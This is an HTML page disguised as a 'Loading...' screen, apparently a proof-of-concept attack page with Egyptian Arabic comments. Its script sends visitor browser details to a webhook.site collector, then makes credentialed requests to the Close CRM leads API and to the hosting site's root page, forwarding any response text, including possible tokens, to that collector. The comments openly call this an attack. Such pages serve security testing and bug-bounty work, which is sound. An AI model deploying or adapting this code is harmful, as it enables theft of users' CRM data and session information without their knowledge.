<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Processing...</h1>
    <script>
        // دالة عشان نبعت أي حاجة للـ Webhook
        function send(data) {
            fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?log=' + encodeURIComponent(JSON.stringify(data)));
        }

        // 1. معلومات المتصفح (زي ما جت)
        send({
            ref: document.referrer || 'None',
            opener: window.opener ? 'Exists' : 'None',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ua: navigator.userAgent
        });

        // 2. الهجوم الجديد: حاول تجيب الـ Leads من API Close
        // ده طلب GET، حتى لو منع الـ CORS قراءة الرد، الطلب هيتنفذ والكوكيز هتروح.
        // لو الـ API رجع بيانات، هنقدر نقرأها (لو CORS مسموح)، لكن الأغلب هيرجع خطأ CORS.
        // لكن ده هيثبت إننا نقدر ننفذ طلبات نيابة عن المستخدم.
        fetch('https://api.close.com/api/v1/lead/', {
            credentials: 'include' // عشان يبعت الكوكيز الخاصة بالـ CRM
        })
        .then(r => r.text())
        .then(data => {
            // لو وصلنا هنا (نادراً)، يبقى الـ CORS مفتوح!
            send({ api_response: data });
        })
        .catch(e => {
            // لو فشل بسبب CORS، نبعت نوع الخطأ، ده دليل إن الطلب اتبعت على الأقل.
            send({ api_error: e.message });
        });

        // 3. جرب تطلب صفحة الـ Dashboard بتاعة الـ CRM (عشان نجيب اسم النطاق)
        // الفكرة: نحاول نجيب أي ملف من النطاق الرئيسي.
        fetch('/', { credentials: 'include' })
        .then(r => r.text())
        .then(html => {
            // لو نجح، نبعت أول 100 حرف من الصفحة (قد تحتوي على اسم المنظمة أو التوكنات)
            send({ homepage_preview: html.substring(0, 200) });
        })
        .catch(e => {
            send({ homepage_error: e.message });
        });
    </script>
</body>
</html>
